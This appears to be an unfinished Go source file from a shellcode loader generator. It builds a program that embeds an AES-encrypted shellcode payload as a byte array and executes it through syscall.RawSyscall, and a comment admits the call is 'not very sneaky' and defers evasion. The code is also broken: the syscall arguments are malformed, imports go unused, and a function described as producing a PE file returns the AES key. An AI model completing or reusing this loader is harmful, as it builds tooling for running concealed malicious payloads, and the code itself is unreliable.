package loader;

import (
    "bytes"
	"debug/pe"
	"encoding/hex"
	"fmt"
	"go/ast"
	"go/token"
	"go/types"
	"io/ioutil"
	"os"

	"golang.org/x/tools/go/gcimporter"
	"golang.org/x/tools/go/ssa"
	"golang.org/x/tools/go/ssa/ssautil"
)


/* Generates full PE file, assuming shellcode has already been encrypted with AES */
func GetPE(sc Shellcode) ([]byte, error) {

    /* create new file that includes shellcode and wrappers */
    fileSet := token.NewFileSet()
    file := &ast.File{
        Name: ast.NewIdent(sc.Filename),
        Decls: []ast.Decl{},
    }

    varList := &ast.ValueSpec{
		Names: []*ast.Ident{ast.NewIdent(sc.SymbolName)},
		Values: []ast.Expr{
			&ast.CompositeLit{
				Type: &ast.ArrayType{
					Elt: &ast.Ident{Name: "byte"},
				},
				Elts: []ast.Expr{},
			},
		},
	}
	for _, b := range sc.Payload {
		varList.Values[0].(*ast.CompositeLit).Elts = append(
            varList.Values[0].(*ast.CompositeLit).Elts,
            &ast.BasicLit{
                Kind:  token.INT,
                Value: fmt.Sprintf("0x%02x", b),
		})
	}
	file.Decls = append(file.Decls, &ast.GenDecl{
		Tok:   token.VAR,
		Specs: []ast.Spec{varList},
	})

    runFunc := &ast.FuncDecl{
		Name: ast.NewIdent("run"),
		Type: &ast.FuncType{
			Params: &ast.FieldList{},
			Results: &ast.FieldList{
				List: []*ast.Field{
					{
						Type: &ast.Ident{
							Name: "error",
						},
					},
				},
			},
		},
		Body: &ast.BlockStmt{
			List: []ast.Stmt{
				&ast.ExprStmt{
					X: &ast.CallExpr{
						Fun: &ast.Ident{
                            // This is is not very sneaky but a problem for later
							Name: "syscall.RawSyscall",
						},
						Args: []ast.Expr{
							&ast.Ident{
								Name: "uintptr",
							},
							&ast.BasicLit{
								Kind:  token.INT,
								Value: "0",
							},
							&ast.Ident{
								Name: "uintptr",
							},
							&ast.UnaryExpr{
								Op: token.AND,
								X: &ast.IndexExpr{
									X: &ast.Ident{
										Name: sc.SymbolName,
									},
									Index: &ast.Ident{
										Name: "uintptr",
									},
								},
							},
							&ast.Ident{
								Name: "uintptr",
							},
							&ast.BasicLit{
								Kind:  token.INT,
								Value: "0",
							},
							&ast.Ident{
								Name: "uintptr",
							},
							&ast.BasicLit{
								Kind:  token.INT,
								Value: "0",
							},
						},
					},
				},
            },
        },
    }

    // TODO: add return statement here & split into multiple functions

    return sc.AesKey, nil
}
